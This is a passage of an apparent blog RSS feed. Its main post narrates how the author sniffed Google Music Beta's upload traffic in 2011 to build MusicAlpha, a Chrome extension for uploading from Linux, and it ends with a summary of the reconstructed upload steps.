&lt;p&gt;&lt;em&gt;&lt;strong&gt;Rather depressing update:&lt;/strong&gt; This sadly no longer works. It was fun and somewhat useful while it lasted. I have no idea why it doesn’t work, and I would really appreciate if someone could find out why it fails. However, it would be a good idea to &lt;a href=&quot;https://chrome.google.com/webstore/detail/obojocfchdgdpgcigcdhdnlakfcbbgfn&quot;&gt;install it anyway&lt;/a&gt; and I guess.&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2011/MusicAlpha%20Upload%20to%20Google%20Music%20Beta%20from%20Linux%20and%20Chrome%20OS/Screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/MusicAlpha%20Upload%20to%20Google%20Music%20Beta%20from%20Linux%20and%20Chrome%20OS/Screenshot-300x195.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Google Music Beta is a pretty cool web app, but the Music Manager sadly only works on Windows and Mac. As a Linux user who unfortunately feels neglected by the service, but still appreciative of being invited to the service a mere day after it’s announcement, I decided to do something to remedy the situation. Not to mention the irony that one can’t even upload music to the service from Google’s own Chrome OS. So &lt;a href=&quot;https://chrome.google.com/webstore/detail/obojocfchdgdpgcigcdhdnlakfcbbgfn&quot;&gt;MusicAlpha&lt;/a&gt; was born.&lt;/p&gt;
&lt;p&gt;This project was a pretty interesting hack, so I guess I’ll try to document the process of how I made it and how it currently works. And also, for any prospective filmmakers, this story might make for an interesting abstract action movie. But for any of you who just want to install the app, &lt;a href=&quot;https://chrome.google.com/webstore/detail/obojocfchdgdpgcigcdhdnlakfcbbgfn&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;inception&quot;&gt;Inception&lt;/h2&gt;
&lt;p&gt;I started this only days after finishing the new revision of Cloud Save, the extension that I never quite understood, but everyone else seemed to get. One part of the newest revision was adding support for Amazon’s Cloud Drive service, which does not have an established API. However, the interactions between the javascript web interface and the server are pretty simple to understand, thanks to the almighty web inspector. The only weird thing was that the actual file upload was actually conducted through Flash, which felt unnecessary but it wasn’t an insurmountable task. But it was all built on carefully learning the way of the web client.&lt;/p&gt;
&lt;p&gt;There was one feature request for Cloud Save to enable saving to Google Music, and that’s when the idea sort of started.&lt;/p&gt;
&lt;p&gt;The first step was to get a Google Music account, nothing surprising there. A few hours after the announcement was the first opportunity for me to access a computer, and also when I hit the “request invite” button. In a shockingly short amount of time of a mere day, I received a nice email saying that I had been invited to the service. Yay. Now the letdown of not being able to upload from Linux begins, as well as the scheming to reverse engineer it.&lt;/p&gt;
&lt;p&gt;A few months ago, I had the idea to do something similar, but with another Google product: Google Goggles. But after hooking up the anrdoid simulator with a http proxy (Charles), and looking at the results. I was rather dismayed, but not particularly surprised by the results: all the communication was encoded using Protobuf. Protobuf, or Protocol Buffers is “Google’s data interchange format”, according to it’s Google Code project page. It’s a structured system for encoding binary data where a .proto template is already known and compiled. Protobufs are bad in much the same way minification is. There are totally justifiable reasons to minify source code, but the elimination of a useful View Source detracts from the open ideal of the web. Though protocol buffers aren’t encrypted, they are not comprehensible without a .proto file to decode them. With a lot of work, one might be able to reverse engineer a .proto file, but it’s certainly much harder than a JSON protocol.&lt;/p&gt;
&lt;p&gt;Before I began, this was the worst fear. That everything as encoded with protocol buffers, and my attempts to mimic it would be rendered futile.&lt;/p&gt;
&lt;h2 id=&quot;packets&quot;&gt;Packets&lt;/h2&gt;
&lt;p&gt;I borrowed a computer which ran Windows 7, and installed the Music Manager in hopes of deciphering the secret enigma of the great google. I needed a simple packet sniffer, and so I used nirsoft’s smartsniff. I didn’t use wireshark because it wasn’t my computer, and I didn’t want to install and download a huge app with an intimidating user interface. Smartsniff worked pretty well, and I thought I was almost there. Packet sniffers generally can’t decode https data without some MITM-esque certificate faking, and I have reason to believe that that wouldn’t work either since running the strings command on the MusicManager.exe file includes something that resembles a public key.&lt;/p&gt;
&lt;p&gt;Anyway, I found two raw unencrypted HTTP requests, and sort of fixated myself on those two.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;POST /uploadsj/rupio HTTP/1.1&lt;/p&gt;
&lt;p&gt;User-Agent: Music Manager (1, 0, 12, 3443 - Windows)&lt;/p&gt;
&lt;p&gt;Host: uploadsj.clients.google.com&lt;/p&gt;
&lt;p&gt;Accept: &lt;em&gt;/&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Cookie: SID=[redacted] domain=.google.com path=/&lt;/p&gt;
&lt;p&gt;Expect: None&lt;/p&gt;
&lt;p&gt;Content-Length: 851&lt;/p&gt;
&lt;p&gt;Content-Type: application/x-www-form-urlencoded&lt;/p&gt;
&lt;p&gt;{“clientId”:”Jumper Uploader”,”createSessionRequest”:{“fields”:[{“inlined”:{“content”:”jumper-uploader-title-19Redacted”,”contentType”:”text/plain”,”name”:”title”}},&lt;/p&gt;
&lt;p&gt;{“external”:{“filename”:”Redacted.mp3”,”name”:”C:\Users\Redacted.mp3”,”put”:{},”size”:610Redacted}},&lt;/p&gt;
&lt;p&gt;{“inlined”:{“content”:”0”,”name”:”AlbumArtLength”}},&lt;/p&gt;
&lt;p&gt;{“inlined”:{“content”:”0”,”name”:”AlbumArtStart”}},&lt;/p&gt;
&lt;p&gt;{“inlined”:{“content”:”3rBe9dCa%c2tBeJdD”,”name”:”ClientId”}},&lt;/p&gt;
&lt;p&gt;{“inlined”:{“content”:”00:1F:R3:DA:C7:ED”,”name”:”MachineIdentifier”}},&lt;/p&gt;
&lt;p&gt;{“inlined”:{“content”:”5a5de21sd-54dsfe-Redacted”,”name”:”ServerId”}},&lt;/p&gt;
&lt;p&gt;{“inlined”:{“content”:”true”,”name”:”SyncNow”}},&lt;/p&gt;
&lt;p&gt;{“inlined”:{“content”:”153”,”name”:”TrackBitRate”}},&lt;/p&gt;
&lt;p&gt;{“inlined”:{“content”:”false”,”name”:”TrackDoNotRematch”}}&lt;/p&gt;
&lt;p&gt;]},”protocolVersion”:”0.8”}
I noticed the second request was rather huge, 3556KB. Just enough to fit a normal-sized MP3. I knew what was in there.
PUT /uploadsj/rupio?upload_id=REDACTED&amp;amp;file_id=000 HTTP/1.1&lt;/p&gt;
&lt;p&gt;User-Agent: Music Manager (1, 0, 12, 3443 - Windows)&lt;/p&gt;
&lt;p&gt;Host: uploadsj.clients.google.com&lt;/p&gt;
&lt;p&gt;Accept: &lt;em&gt;/&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Cookie: SID=REDACTED domain=.google.com path=/&lt;/p&gt;
&lt;p&gt;Content-Type: audio/mpeg&lt;/p&gt;
&lt;p&gt;Expect: None&lt;/p&gt;
&lt;p&gt;Content-Length: 3141REDACTED&lt;/p&gt;
&lt;p&gt;ID3…..%vTENC….@..WXXX……..TIT2……. Redacted
At this point, I was relatively ecstatic. Or at least, I will pretend that I was, because everything looked elegantly and remarkably simple. I had no idea where the upload_id came from, but I figured that it was part of the response from the first POST request. Part of the problem was that SmartSniff didn’t give me the actual responses to the HTTP requests, only the request data. Or at least from the five minutes that I bothered using it. The cookie looked like a generic cookie that would exist in a normal browser session.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;prototype&quot;&gt;Prototype&lt;/h2&gt;
&lt;p&gt;Since it used generic browser cookies, the simplest way to start would be to make a browser extension. Specifically, a Chrome App. That way, I could get the necessary permissions to do all the cross domain security protocol violations and probe around a bunch of requests. Since XHRs already include cookies for a specific domain, there’s nothing I need to do to set the cookies. I hoped and suspected that the User-Agent, Accept, and Expect headers were basically ignored, and the content-type would be rather trivial to set.&lt;/p&gt;
&lt;p&gt;A lesson in premature optimization was the huge block of JSON which got sent with the first POST request. I had no idea what was really essential, so basically, I just deleted almost everything there except for what I thought might be really important: the file name and size. There were no errors in the POST request, so I figured it was okay to delete all of that stuff. I ran the POST and just as I suspected, the JSON that resulted included the upload_id, in fact, it included the entire PUT url, which was pretty nice.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;{“sessionStatus”:{“state”:”OPEN”,”externalFieldTransfers”:[{“name”:”REDACTED.mp3”,”status”:”IN_PROGRESS”,”bytesTransferred”:0,”bytesTotal”:314REDACTED,”putInfo”:{“url”:”&lt;a href=&quot;http://uploadsj.clients.google.com/uploadsj/rupio?upload_id=AEdREDACTED&amp;amp;file_id=000&amp;quot;},&amp;quot;content_type&amp;quot;:&amp;quot;audio/mpeg&amp;quot;}],&amp;quot;upload_id&amp;quot;:&amp;quot;AEdREDACTED&amp;quot;}}&quot;&gt;http://uploadsj.clients.google.com/uploadsj/rupio?upload_id=AEdREDACTED&amp;amp;file_id=000&amp;quot;},&amp;quot;content_type&amp;quot;:&amp;quot;audio/mpeg&amp;quot;}],&amp;quot;upload_id&amp;quot;:&amp;quot;AEdREDACTED&amp;quot;}}&lt;/a&gt;
Then, when I executed the subsequent PUT request. I was scared.
{“errorMessage”:{“reason”:”REQUEST_REJECTED”,”additionalInfo”:{“uploader_service.GoogleRupioAdditionalInfo”:{“completionInfo”:{“status”:”REJECTED”,”customerSpecificInfo”:{“ResponseCode”:404}},”requestRejectedInfo”:{“reasonDescription”:”agent_rejected”}}},”upload_id”:”AEdREDACTED”}}
Scary. The rejection reason was “agent_rejected”, which made me think about the User-Agent header, and I wondered if that was supposed to matter. If that did matter, then I would have to prototype it in a different language since XMLHttpRequests forbid the setting of the User-Agent and other headers for security reasons (even operating in a privledged environment!).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;But thankfully, before attempting the drastic route, I pasted back in the alleged cruft, the jumper-uploader-title, TrackDoNotRematch, TrackBitRate, SyncNow, ServerId, MachineIdentifier, ClientID, AlbumArtStart (hey that rhymes!), and AlbumArtLength. Magically now, it worked. Yay.&lt;/p&gt;
&lt;h2 id=&quot;rupio&quot;&gt;Rupio&lt;/h2&gt;
&lt;p&gt;During my quest to understand the bizarre agent_rejected error (because I totally fear rejection, they should have used a nicer word), I tried googling GoogleRupioAdditionalInfo. (I had googled “Rupio” before, since that was part of the POST url, but that didn’t yield any relevant results, it just ended up being a bunch of people’s names). Searching GoogleRupioAdditionalInfo yielded a more limited subset which happened to be more interesting.&lt;/p&gt;
&lt;p&gt;The first result, from the SMEStorage Blog described an error emitted by the Google Docs platform. The next result was on the Picasa help forums, about “Upload video results in Error”. Then was a french language forum which mentioned an error which included GoogleRupioAdditionalInfo, this time on the url “upload.youtube.com”.&lt;/p&gt;
&lt;p&gt;So, it seems “Rupio” is the codename (or just the name, but it’s much more fun imagining that there are subliminal codes everywhere) of a unified Google data upload/storage platform. That’s pretty cool. It probably makes sense that they have a sort of unified file storage system across Google Docs, Picasa, and Youtube, since it would probably be easier to maintain a system which is internally consistent. But to inject a sensationalist twist where occam’s razor shows that it’s not justified, this is a hint at an upcoming unified Google file storage service. A sort of file-browser dashboard which links all media and document files together in an accessible and uniform manner.&lt;/p&gt;
&lt;h2 id=&quot;shiny&quot;&gt;Shiny&lt;/h2&gt;
&lt;p&gt;It worked. Or at least, it seemed to work. Vaguely. At this point, I was reasonably satisfied and began sculpting a nice pretty interface for it. Following my usual way, I just stole the Tango icon for an audio file mime type and built the entire interface around it. I remembered that earlier that day, I had discovered something called Layer Styles, which is a photoshop gradient/style clone that instead generates CSS3 gradients. I thought that was cool and I remembered it, so I played around with it and made a centered rectangle. Gray on Gray.&lt;/p&gt;
&lt;p&gt;I decided on a name for it: MusicAlpha. It’s a sort of play on how this Google product features Beta in a way which is much more prominently than usual, with the gray “beta” the same size as the actual “music”. The Alpha sort of says something about how it will almost eternally be stuck in this unstable and incomplete form. It also reminded me of one of my favorite websites: wolfram alpha, and how the logo is stylized WolframAlpha or Wolfram|Alpha.&lt;/p&gt;
&lt;p&gt;I wanted it to be minimal, but I’ve since adopted the belief that drag-and-drop file selection was only a fad. Sure, it’s often really useful, but it’s not great to restrict to that. A hybrid approach is much better, and if you have to have only one, then the standard browse button is better since you can drag and drop files to that button (on chrome, anyway) without any special code. Drag and Drop is often quite terrible on laptops, and I’m not sure if you can even drag and drop files with Chrome OS, since the file browser might be modal.&lt;/p&gt;
&lt;p&gt;There’s not much to the interface, it’s probably as minimal as it can get. Two links, one to the service, the other to me. A button. That’s it.&lt;/p&gt;
&lt;h2 id=&quot;dismay&quot;&gt;Dismay&lt;/h2&gt;
&lt;p&gt;At some point in every good story (not implying that this is a good story), there’s false hope, where the protagonist (not implying that I’m the protagonist here, either) believes that he or she (not implying that I’m a she) is closer to the end than is factually warranted (I’m actually implying that that’s exactly what happened). I checked the Google Music song list, and lo and behold, the song was there.&lt;/p&gt;
&lt;p&gt;Sort of. Not really.&lt;em&gt; Something&lt;/em&gt; was. Not sure it was a song.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2011/MusicAlpha%20Upload%20to%20Google%20Music%20Beta%20from%20Linux%20and%20Chrome%20OS/Screenshot1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/MusicAlpha%20Upload%20to%20Google%20Music%20Beta%20from%20Linux%20and%20Chrome%20OS/Screenshot1-300x60.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There was a blank row. Double click it, and something does play. And it is the song. But, there’s no way to seek because incidentally, it doesn’t know how long the track is, so there’s no way to render the position of the song.&lt;/p&gt;
&lt;p&gt;It was late, and this was frustrating, so I just posted a terse blog post announcing the beginning of the project:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;So pretty soon, I hacked together something that almost sort of worked, with one rather significant caveat: It doesn’t pick up any tag data, name, time, artist, album, etc. I can’t figure out why. I guess I’ll try some more tomorrow.
And by the way, I totally lied. I didn’t try at all the next day.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Yesterday, that is, May 13th, the delightful Friday the Thirteenth, I tried again. I installed Music Manager on a VMWare installation of Windows XP, and sniffed the traffic with Wireshark running on the host computer. Didn’t notice anything new in the plethora of data which happened to get exchanged. I tried running smartsniff from the VM, but every time I tried to start sniffing, VMWare magically crashed.&lt;/p&gt;
&lt;h2 id=&quot;skyjam&quot;&gt;SkyJam&lt;/h2&gt;
&lt;p&gt;At this point, I thought of looking at the MusicManager.exe binary. Usually, binaries have some random strings in them, which you can look at to give some hint at what it does, without actually decompiling something. I’m now going to proceed to anachronistically mention something about android, because of a certain URL that I find out later in this chronology: android.clients.google.com. So I used strings MusicManager.exe | grep android, and found some rather interesting things&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2-.wireless_android_skyjam.CopyrightStatus.Type&lt;/p&gt;
&lt;p&gt;2”.wireless_android_skyjam.ProductId&lt;/p&gt;
&lt;p&gt;wireless_android_skyjam.Uits&lt;/p&gt;
&lt;p&gt;Metadata.ParentalAdvisoryType
There appears to be 214 mentions of the phrase “skyjam” in the executable, which I assume is not some new solar powered Google sandwich filling distribution mechanism powered by artificial intelligence driven aeronautically mobile condiment dispensers (obviously using Arduinos).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I have no idea what Skyjam is, but that’s totally a much cooler name than Google Music, regardless of how big you write “beta”. And what’s wireless_android_skyjam? Why is skyjam so deeply tied with wireless and android? Maybe it’s got something to do with flying robot sandwich machines. Or not.&lt;/p&gt;
&lt;p&gt;Maybe it has something to do with that Simplify Media company which Google bought last year. Or maybe I’m just a little sad that the product ended. According to TechCrunch,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Google VP Vic Gundotra said that &lt;a href=&quot;http://techcrunch.com/2010/05/20/um-did-google-just-quietly-launch-a-web-based-itunes-competitor-yep/#ixzz0oUJBJO3l&quot;&gt;Simplify’s technology&lt;/a&gt; will be used to offer a desktop app that will give you access to all of your (DRM-free) media on your Android devices remotely, using Google’s new iTunes competitor on the web.&lt;/p&gt;
&lt;p&gt;&amp;gt;
Desktop App: Check. Android: Check. New iTunes Competitor on the Web: Check. Simplify’s Technology: Not so much.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For those who aren’t familiar with what Simplify did (which I assume is nigh everyone), it streamed your music by making your desktop into something of a server, so your huge cache of music can be accessible by any mobile device remotely.&lt;/p&gt;
&lt;h2 id=&quot;fishtank&quot;&gt;Fishtank&lt;/h2&gt;
&lt;p&gt;I had a random false lead. I thought that the server still read ID3 data on itself, and noticed that the HTTP dump was somehow slightly different from the original file. It was the same length. The exact same length, but some of the bytes were different. Most were the same, and they were all in the same place, but for example, all 0x00’s seemed to have been swapped with 0xe4’s. Some other bytes were also different, and in retrospect this was probably because the program which created the http dump sucked and encoded all the bytes wrong or something. But I tried opening it up in Ghex and I swapped every 0xe4 with a 0x00, and magically the broken file now played, with one exception: the audio now sounded like a fishtank. It’s like everything’s just water, magestically moving around with exquisite sublimity.&lt;/p&gt;
&lt;h2 id=&quot;sniffing&quot;&gt;Sniffing&lt;/h2&gt;
&lt;p&gt;I borrowed another Windows computer this time, and tried again. This time, I also tried the HTTP Proxy called Fiddler, which seemed to be able to capture more information, or at least give me more of the information that I would find useful and less of what I wouldn’t find useful. I noticed that for every file which was uploaded, there were in fact three requests, not two as I had previously observed.&lt;/p&gt;
&lt;p&gt;So where had this covert HTTP request been hiding? Behind in the magical realm of HTTPS/TLS encryption. I couldn’t peek into the actual content of the HTTPS requests because of the fact it was encrypted. And as the strings command had revealed earlier, there was a huge block of base64 encoded text which appeared to look like a sort of public key. It suddenly connected, the Music Manager probably has its own list of trusted certificate authorities, and that’s why adding a mere certificate to Windows wouldn’t do a thing.&lt;/p&gt;
&lt;p&gt;But the unencrypted CONNECT request, which initiates a HTTPS connection said enough.&lt;/p&gt;
&lt;p&gt;There was a request to android.clients.google.com and it was encoded with gasp: application/x-protobufs. If this was some sort of action movie, here would be the scene where the antagonist from the previous movie reveals that he is still alive (with some facial scarring) and the person responsible for all the disappearing bodies (of data).&lt;/p&gt;
&lt;p&gt;I was about to give up at this point, but then a new idea sturck.&lt;/p&gt;
&lt;h2 id=&quot;a-new-hope&quot;&gt;A New Hope&lt;/h2&gt;
&lt;p&gt;This is the second movie-title article sub-title that I’m aware of, unless there’s a movie called “Packet Sniffing”. For the prospective filmmaker, this is when the protagonist has the flashback and remembers that time, long long ago (though here it’s only like four days, you can take creative liberties), when refining the art of hackery, a task involved crafting an implementation of a storage system from the web interface of a specific cloud drive service.&lt;/p&gt;
&lt;p&gt;So, I noticed that I had spent so much time exploring what enigma lay beyond the surface of Google Music, that I totally forgot to actually use the service. And when I did, I realized that there was an Edit Song Info context button. Trying the feature out, it seems to be a simple JSON post to a certain modifyentries URL.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div&gt;POST &lt;a href=&quot;http://music.google.com/music/services/modifyentries?u=0&amp;amp;xt=AM-REDACTED&quot;&gt;http://music.google.com/music/services/modifyentries?u=0&amp;amp;xt=AM-REDACTED&lt;/a&gt;&lt;/div&gt;

&lt;div&gt;{“entries”:[{&lt;/div&gt;

&lt;div&gt;“genre”:”REDACTED”,&lt;/div&gt;

&lt;div&gt;“beatsPerMinute”:0,&lt;/div&gt;

&lt;div&gt;“albumArtistNorm”:””,&lt;/div&gt;

&lt;div&gt;“album”:”REDACTED”,&lt;/div&gt;

&lt;div&gt;“artistNorm”:””,&lt;/div&gt;

&lt;div&gt;“lastPlayed”:1305419744984200,&lt;/div&gt;

&lt;div&gt;“durationMillis”:192168,&lt;/div&gt;

&lt;div&gt;“url”:””,&lt;/div&gt;

&lt;div&gt;“id”:”564ads4f8e4-REDACTED”,&lt;/div&gt;

&lt;div&gt;“composer”:””,&lt;/div&gt;

&lt;div&gt;“creationDate”:130541974874500,&lt;/div&gt;

&lt;div&gt;“title”:”REDACTED”,&lt;/div&gt;

&lt;div&gt;“albumArtist”:”REDACTED”,&lt;/div&gt;

&lt;div&gt;“playCount”:0,&lt;/div&gt;

&lt;div&gt;“name”:”REDACTED”,&lt;/div&gt;

&lt;div&gt;“artist”:”REDACTED”,&lt;/div&gt;

&lt;div&gt;“titleNorm”:””,&lt;/div&gt;

&lt;div&gt;“rating”:0,&lt;/div&gt;

&lt;div&gt;“comment”:”REDACTED”,&lt;/div&gt;

&lt;div&gt;“albumNorm”:””,&lt;/div&gt;

&lt;div&gt;“year”:”2004”,&lt;/div&gt;

&lt;div&gt;“track”:”04”,&lt;/div&gt;

&lt;div&gt;“totalTracks”:””,&lt;/div&gt;

&lt;div&gt;“disc”:””,&lt;/div&gt;

&lt;div&gt;“totalDiscs”:””&lt;/div&gt;

&lt;p&gt;&lt;div&gt;}]}&lt;/div&gt;
Amazing. I just stumbled on the magical code which would allow me to finish the project. Yay. Now I had to figure out what the xt= parameter means (after determining it’s necessity). My first hunch was to search the HTML source of the page, because the magical access codes for Amazon Cloud Drive were put inside a hidden input element. But no, it wasn’t there. Now the fear starts settling in, what if it’s a strategically computed magical super string? But why would they ever do that?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Somehow I noticed somewhere on every time the page is loaded, the network logs indicate a Set-Cookie: xt=AM-REDACTED. Now I knew how to get it: Just send an XHR to the cloud player and copy the cookie.&lt;/p&gt;
&lt;h2 id=&quot;serverid&quot;&gt;ServerID&lt;/h2&gt;
&lt;p&gt;Now, the important pat of all the items in the entries object is probably the id. Everything else seems somewhat generic, and probably exists for any song that you throw at the service, but id clearly has a definite, important, non-random, predetermined value. I thought that there was no correlation between the data passed from the uploaded data and the id which was here, since the upload_id was way too long and had nothing in common with this song id.&lt;/p&gt;
&lt;p&gt;Since the songs that get uploaded have no title, they always appear first on the alphabetical list of songs, so I figured I would just pull a list of the songs, alphabetically, and then take the first one to get the ID. Then I discovered the auto-playlists, which included one for most recently added.&lt;/p&gt;
&lt;p&gt;Unless you have the power of omniscience, you don’t know that the format of the IDs here were like das8f7-adf0w8f-adf87we-mwere, because I slapped a huge REDACTED on the latter half. The random string generating code that I’ve used for years out of convenience is Math.random().toString(36).substr(2), which basically generates a random float, converts the fractional part to base 36 (0-9 a-z) and strips the leading “0.” from the string. This incidentally ends up being quite short (especially on chrome, it’s much longer on firefox), and lacks the dashes.&lt;/p&gt;
&lt;p&gt;So I looked at the ID for one of the streams and noticed that the id string was unusually short. I started wondering why something like that would happen, and then it struck me, not quite like lightning because I’m still alive (though whether or not I am when you’re reading this is a totally different question). This file ID was the same thing as the ServerID which I thought was just a random useless value that was arbitrarily required for it to work. I deleted the whole getRecent routine and suddenly everything started to make sense.&lt;/p&gt;
&lt;h2 id=&quot;fish&quot;&gt;Fish&lt;/h2&gt;
&lt;p&gt;You probably don’t remember my old blog post, almost a year ago, titled A Bright Coloured Fish: Parsing ID3v2 Tags in Javascript and ExtensionFM. Recently, by fate, I happen to have used that code more times that I’m comfortable with, and it seems that once again I must revive this old memory. It’s fairly outdated, and some things are very nasty. Not being able to parse ID3v1 is pretty terrible, though I don’t think I have any songs using v1.&lt;/p&gt;
&lt;p&gt;I hoped that Google’s magical server farm would have parsed out the ID3 data, but that doesn’t seem to be the case. I have to manually parse them in the client.&lt;/p&gt;
&lt;p&gt;I had to change the id3v2 library a slight bit: the picture parsing code now includes a blob attribute, since the the album art must be uploaded to Google’s servers in order to be included in the metadata.&lt;/p&gt;
&lt;p&gt;I guess that fishtank sound was an omen. I’m sure the prospective filmmaker could use it in some way like this.&lt;/p&gt;
&lt;h2 id=&quot;time&quot;&gt;Time&lt;/h2&gt;
&lt;p&gt;Rather auspiciously, the modifyentries command included durationMillis. Since it became evident that the music player app had no way of knowing the length of a song without some tag data, that it would be impossible to seek to a certain portion of the song without this ability, it was really important. But since this was from the API for a user-facing operation, and editing the length of a song isn’t something that a user can or should be able to edit, it was pretty fortunate that that was included as part of the API.&lt;/p&gt;
&lt;p&gt;This wasn’t without problems though. It’s not that easy to measure the length of a song. The Length tag of a MP3 file is actually seldom included, so that clearly can’t work. I looked at how to measure the length, and it was pretty scary, since it doesn’t seem like there’s any way other than parsing all the frames out and multiplying the bitrates.&lt;/p&gt;
&lt;p&gt;But this time, HTML5 comes to the rescue. I never thought I would be so happy to use . I just take the file, convert it to a blob URL through that nest of if/else statements that handles different versions of chrome. I open it with new Audio and wait for the metadata event, indicating that I now know the length of the song to thirteen places after the decimal. Because of course, I would hate to miss the last picosecond of my song.&lt;/p&gt;
&lt;p&gt;I felt sad for the little femtoseconds and attoseconds who were neglected by Google when they decided that the song lengths should be milliseconds. Not quantized divisions of Planck time.&lt;/p&gt;
&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;
&lt;p&gt;At this point, nothing interesting really happened. I fixed up the interface, added queueing, and other insignificant things. I published it and spent the rest of day writing a hopelessly long document describing it.&lt;/p&gt;
&lt;h2 id=&quot;protocol&quot;&gt;Protocol&lt;/h2&gt;
&lt;p&gt;For those who want to build their own programs which upload to Google Music, I guess I’ll write a summary of how it works.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Get Song Metadata (ID3 data, Duration, primarily)&lt;/li&gt;
&lt;li&gt;Login to Google&lt;/li&gt;
&lt;li&gt;POST to uploadsj.clients.google.com/uploadsj/rupio&lt;/li&gt;
&lt;li&gt;PUT to putUrl as part of the response of previous operation&lt;/li&gt;
&lt;li&gt;Load music.google.com/music/listen and capture xt value from Set-Cookie response header&lt;/li&gt;
&lt;li&gt;(Optional) Upload Album Art to music.google.com/music/services/imageupload?u=0&amp;amp;xt=&lt;/li&gt;
&lt;li&gt;Set file metadata via music.google.com/music/services/modifyentries?u=0&amp;amp;xt=&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;friendly-reminder&quot;&gt;Friendly Reminder&lt;/h2&gt;
&lt;p&gt;To get the app described in this lengthy narrative, &lt;a href=&quot;https://chrome.google.com/webstore/detail/obojocfchdgdpgcigcdhdnlakfcbbgfn&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Uploading to Google Music Beta from Linux</title>
      <link>http://antimatter15.com/2011/05/uploading-to-google-music-beta-from-linux/</link>
      <pubDate>Wed, 11 May 2011 07:17:23 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/05/uploading-to-google-music-beta-from-linux/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2011/Uploading%20to%20Google%20Music%20Beta%20from%20Linux/Screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Uploading%20to%20Google%20Music%20Beta%20from%20Linux/Screenshot-300x195.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So yeah, I just got a Music Beta invite today, and it’s pretty cool except for the fact it doesn’t have any means  of uploading besides the desktop application on Windows and Mac.&lt;/p&gt;
&lt;p&gt;So, after a little packet sniffing, I got the basic idea of how it works. You send a POST to some URL with some info and then that returns a URL that you PUT to in order to add the song.&lt;/p&gt;
&lt;p&gt;So pretty soon, I hacked together something that almost sort of worked, with one rather significant caveat: It doesn’t pick up any tag data, name, time, artist, album, etc. I can’t figure out why. I guess I’ll try some more tomorrow.&lt;/p&gt;
&lt;p&gt;The prototype is at &lt;a href=&quot;https://github.com/antimatter15/musicalpha&quot;&gt;https://github.com/antimatter15/musicalpha&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Cloud Save 1.3</title>
      <link>http://antimatter15.com/2011/05/cloud-save-1-3/</link>
      <pubDate>Tue, 10 May 2011 03:23:34 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/05/cloud-save-1-3/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2011/Cloud%20Save%201.3/Screenshot-14.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Cloud%20Save%201.3/Screenshot-14.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-14&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So, I finally updated my most popular browser extension:&lt;a href=&quot;https://chrome.google.com/webstore/detail/omiekjeapoonbhiemenfoccbdpeagdah&quot;&gt; Cloud Save&lt;/a&gt;. This adoption has always sort of puzzled me, as it was originally simply a 30 minute hack on drag2up. So I’m trying to be careful not to introduce any huge changes in fear of alienating that magical use case that everyone else seems to have stumbled upon.&lt;/p&gt;
&lt;p&gt;Nevertheless, 1.3 introduces lots of useful features. First and foremost is the introduction of a progress bar. I really can’t imagine using it without the progress bar or some other indicator - like how it was in the last version (yet how people still found it useful absolutely bewilders me). The progress dialog is awesome and probably the most significant feature, and after that was just a few backend changes which enabled this.&lt;/p&gt;
&lt;p&gt;Published retroactively on 10/22/11&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google Drive + Cloud Save</title>
      <link>http://antimatter15.com/2011/04/google-drive-cloud-save/</link>
      <pubDate>Thu, 28 Apr 2011 21:48:01 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/04/google-drive-cloud-save/</guid>
      <author></author>
